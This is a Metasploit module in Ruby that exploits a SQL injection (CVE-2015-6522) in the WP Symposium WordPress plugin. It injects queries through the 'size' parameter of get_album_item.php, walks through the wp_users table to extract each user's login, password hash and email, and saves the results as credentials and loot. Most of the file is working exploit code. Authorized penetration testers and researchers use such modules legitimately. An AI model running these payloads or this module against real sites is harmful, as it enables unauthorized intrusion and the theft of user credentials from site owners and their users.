##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress Symposium Plugin SQL Injection',
      'Description'     => %q{
        This module exploits a SQL injection vulnerability in the WP Symposium plugin
        before 15.8 for WordPress, which allows remote attackers to extract credentials
        via the size parameter to get_album_item.php.
      },
      'Author'          =>
        [
          'PizzaHatHacker',                       # Vulnerability discovery
          'Matteo Cantoni <goony[at]nothink.org>' # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['CVE', '2015-6522'],
          ['EDB', '37824']
        ],
      'DisclosureDate'  => 'Aug 18 2015'
      ))

    register_options(
      [
        OptString.new('URI_PLUGIN', [true, 'The WordPress Symposium Plugin URI', 'wp-symposium'])
      ])
  end

  def check
    check_plugin_version_from_readme('wp-symposium', '15.8.0', '15.5.1')
  end

  def uri_plugin
    normalize_uri(wordpress_url_plugins, datastore['URI_PLUGIN'], 'get_album_item.php')
  end

  def send_sql_request(sql_query)
    uri_complete = normalize_uri(uri_plugin)

    begin
      res = send_request_cgi(
        'method'   => 'GET',
        'uri'      => uri_complete,
        'vars_get' => { 'size' => sql_query }
      )

      return nil if res.nil? || res.code != 200 || res.body.nil?

      res.body

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Timeout::Error, ::Errno::EPIPE => e
      vprint_error("#{peer} - The host was unreachable!")
      return nil
    end
  end

  def run
    vprint_status("#{peer} - Attempting to connect...")
    vprint_status("#{peer} - Trying to retrieve the first user id...")
    first_id = send_sql_request('id from wp_users order by id asc limit 1 ; --')
    if first_id.nil?
      vprint_error("#{peer} - Failed to retrieve the first user id... Try with check function!")
      return
    else
      vprint_status("#{peer} - First user-id is '#{first_id}'")
    end

    vprint_status("#{peer} - Trying to retrieve the last user id...")
    last_id = send_sql_request('id from wp_users order by id desc limit 1 ; --')
    if last_id.nil?
      vprint_error("#{peer} - Failed to retrieve the last user id")
      return
    else
      vprint_status("#{peer} - Last user-id is '#{last_id}'")
    end

    credentials = ""

    vprint_status("#{peer} - Trying to retrieve the users informations...")
    for user_id in first_id..last_id
      separator = Rex::Text.rand_text_numeric(7,bad='0')
      user_info = send_sql_request("concat_ws(#{separator},user_login,user_pass,user_email) from wp_users where id = #{user_id} ; --")

      if user_info.nil?
        vprint_error("#{peer} - Failed to retrieve the users info")
        return
      else
        values = user_info.split("#{separator}")

        user_login = values[0]
        user_pass  = values[1]
        user_email = values[2]

        print_good("#{peer} - #{sprintf("%-15s %-34s %s", user_login, user_pass, user_email)}")
        connection_details = {
            module_fullname: self.fullname,
            username: user_login,
            private_data: user_pass,
            private_type: :nonreplayable_hash,
            status: Metasploit::Model::Login::Status::UNTRIED,
            proof: user_email
        }.merge(service_details)
        create_credential(connection_details)

        credentials << "#{user_login},#{user_pass},#{user_email}\n"
      end
    end

    unless credentials.empty?
      loot = store_loot("wp_symposium.http","text/plain", rhost, credentials)
      vprint_good("Credentials saved in: #{loot}")
    end
  end
end
